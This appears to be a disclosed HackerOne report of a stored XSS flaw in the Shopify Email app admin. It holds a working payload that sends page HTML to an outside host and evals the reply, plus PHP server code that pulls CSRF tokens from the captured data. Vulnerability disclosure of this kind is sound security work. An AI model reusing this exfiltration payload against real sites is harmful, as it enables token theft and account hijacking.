# XSS within Shopify Email App - Admin

## Report Details
- **Report ID**: 869831
- **URL**: https://hackerone.com/reports/869831
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2020-05-10T02:11:36.379Z
- **Disclosed**: 2020-09-14T19:56:53.154Z

## Reporter
- **Username**: imgnotfound
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
The Shopify Email Application is vulnerable to XSS

A user with only **Settings** https://hackerone.myshopify.com/admin/settings/general access can inject html within the **Apartment, suite, etc. (optional)** of the **Store address** section that will then be displayed in the Shopify Email Template edition

## Steps to reproduce
1. Open **Settings** page
1. Insert malicious HTML within the **Apartment, suite, etc. (optional)** field. Please note that the inserted code is a bit too complex for nothing but was just trying out if it was possible to "bypass" the 255 characters limit , which is possible. (Code snippet can be found below).
██████
3. Install Shopify Email App
4. Select a template that displays **Apartment, suite, etc. (optional)** field
{F822194}


## Javascript code used
```
<img src="a:" onerror="var t=setTimeout;t(function(){var b=function(d){var x=new XMLHttpRequest;t(function(){eval(x.responseText)},2000);x.open('POST','https://fbs.ninja');x.send(d)};window.parent.postMessage(b(document.head.innerHTML),'*');},2000)"/>
```

## PHP code of https://fbs.ninja used in the XMLHttpRequest
```
<?
header("Access-Control-Allow-Origin: *");

$html = file_get_contents('php://input');

$doc = DOMDocument::loadHTML($html);
$xpath = new DOMXPath($doc);
$query = "//meta[@name='csrf-token']";
$entries = $xpath->query($query);

$csrf = "";
foreach ($entries as $entry) {
	$csrf = $entry->getAttribute('content');
	break;
}

$request = "alert('CSRF Token: " . $csrf . "');";

echo $request;

?>

## Impact

An attacker could at least trigger requests to the https://email.shopifyapps.com/graphql endpoint.

## Attachments
- Screen_Shot_2020-05-09_at_9.24.54_PM.png
